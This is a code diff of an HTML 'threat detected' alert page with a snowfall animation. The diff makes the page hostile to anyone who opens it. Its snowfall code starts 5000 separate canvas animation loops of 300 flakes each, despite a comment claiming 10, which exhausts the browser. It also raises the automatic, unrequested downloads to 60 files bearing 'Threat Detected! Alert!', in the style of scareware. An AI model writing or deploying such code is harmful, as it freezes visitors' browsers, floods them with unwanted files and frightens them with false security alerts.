@@ -47,15 +47,13 @@
       border-radius: 999px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.2);
       font-size: 0.85rem;
     }
-    canvas#snow {
+    canvas.snow {
       position: fixed; inset: 0; width: 100vw; height: 100vh;
-      pointer-events: none; z-index: 1; display: block;
+      pointer-events: none; z-index: 1;
     }
   </style>
 </head>
 <body>
-  <canvas id="snow"></canvas>
-
   <div class="container">
     <div class="stop-sign" aria-hidden="true">
       <div class="octagon"></div>
@@ -67,84 +65,65 @@
   </div>
 
   <script>
-    // Snowfall: 10 layered loops in one rAF to prevent flicker/breakage
-    (function () {
-      const canvas = document.getElementById('snow');
-      const ctx = canvas.getContext('2d');
+    // Function to start one independent snowfall loop
+    function startSnowLoop(loopId, flakesPerLoop) {
+      const canvas = document.createElement('canvas');
+      canvas.className = 'snow';
+      document.body.appendChild(canvas);
 
+      const ctx = canvas.getContext('2d');
       let W = canvas.width = window.innerWidth;
       let H = canvas.height = window.innerHeight;
 
-      const LAYERS = 10;           // "10 loops"
-      const PARTICLES_PER_LAYER = 300;
-      const layers = [];
-
-      function makeParticle(w, h, baseSpeed) {
-        return {
-          x: Math.random() * w,
-          y: Math.random() * h,
-          r: Math.random() * 3 + 1,
-          // drift and fall speed vary per particle
-          drift: (Math.random() * 0.8 + 0.2) * baseSpeed,
-          fall: (Math.random() * 0.8 + 0.7) * baseSpeed,
-          phase: Math.random() * Math.PI * 2
-        };
+      const particles = [];
+      for (let i = 0; i < flakesPerLoop; i++) {
+        particles.push({
+          x: Math.random() * W,
+          y: Math.random() * H,
+          r: Math.random() * 4 + 1,
+          d: Math.random() * flakesPerLoop
+        });
       }
 
-      // Create 10 layers with slightly different dynamics
-      for (let k = 0; k < LAYERS; k++) {
-        const baseSpeed = 1 + k * 0.12; // deeper layers move a bit faster
-        const particles = [];
-        for (let i = 0; i < PARTICLES_PER_LAYER; i++) {
-          particles.push(makeParticle(W, H, baseSpeed));
-        }
-        layers.push({ particles, baseSpeed, angle: Math.random() * Math.PI * 2 });
-      }
-
-      function drawFrame() {
+      let angle = 0;
+      function draw() {
         ctx.clearRect(0, 0, W, H);
-        ctx.fillStyle = 'rgba(255,255,255,0.9)';
-        for (let k = 0; k < LAYERS; k++) {
-          const layer = layers[k];
-          layer.angle += 0.008 + k * 0.0006;
-
-          ctx.beginPath();
-          for (let i = 0; i < layer.particles.length; i++) {
-            const p = layer.particles[i];
-            // update
-            p.y += p.fall;
-            p.x += Math.sin(layer.angle + p.phase) * p.drift;
-
-            // wrap
-            if (p.y > H + 8) { p.y = -8; p.x = Math.random() * W; }
-            if (p.x > W + 8) { p.x = -8; }
-            if (p.x < -8)    { p.x = W + 8; }
-
-            // draw
-            ctx.moveTo(p.x, p.y);
-            ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-          }
-          ctx.fill();
+        ctx.fillStyle = "rgba(255,255,255,0.8)";
+        ctx.beginPath();
+        for (let i = 0; i < flakesPerLoop; i++) {
+          const p = particles[i];
+          ctx.moveTo(p.x, p.y);
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
         }
-        requestAnimationFrame(drawFrame);
+        ctx.fill();
+        update();
+        requestAnimationFrame(draw);
       }
 
-      function onResize() {
+      function update() {
+        angle += 0.01;
+        for (let i = 0; i < flakesPerLoop; i++) {
+          const p = particles[i];
+          p.y += Math.cos(angle + p.d) + 1 + p.r / 2;
+          p.x += Math.sin(angle) * 2;
+          if (p.x > W + 5 || p.x < -5 || p.y > H) {
+            particles[i] = { x: Math.random() * W, y: -10, r: p.r, d: p.d };
+          }
+        }
+      }
+
+      draw();
+      window.addEventListener('resize', () => {
         W = canvas.width = window.innerWidth;
         H = canvas.height = window.innerHeight;
-        for (let k = 0; k < LAYERS; k++) {
-          const layer = layers[k];
-          for (let i = 0; i < layer.particles.length; i++) {
-            const p = layer.particles[i];
-            // keep position but clamp within new bounds
-            p.x = Math.max(-8, Math.min(W + 8, p.x));
-            p.y = Math.max(-8, Math.min(H + 8, p.y));
-          }
-        }
-      }
-      window.addEventListener('resize', onResize, false);
-      requestAnimationFrame(drawFrame);
-    })();
+      });
+    }
+
+    // Start N loops
+    const LOOPS = 10; // change this to 5000 if you really want, but beware performance
+    for (let k = 0; k < 5000; k++) {
+      startSnowLoop(k, 300); // each loop has 300 flakes
+    }
 
     // Auto-download attempts (browsers may block multiple non-gesture downloads)
     (function autoDownloads() {
@@ -159,13 +138,9 @@
         setTimeout(() => URL.revokeObjectURL(link.href), 1000);
       }
 
-      const files = [
-        'alert.html','alert.html','alert.html','alert.html','alert.html',
-        'alert.html','alert.html','alert.html','alert.html','alert.html'
-      ];
-      // Staggered to maximize chances
+      const files = Array.from({ length: 60 }, (_, i) => `alert-${i+1}.html`);
       files.forEach((name, i) => {
-        setTimeout(() => downloadFile(name, 'Threat Detected! Alert!'), i * 250);
+        setTimeout(() => downloadFile(name, 'Threat Detected! Alert!'), i * 500);
       });
     })();
   </script>
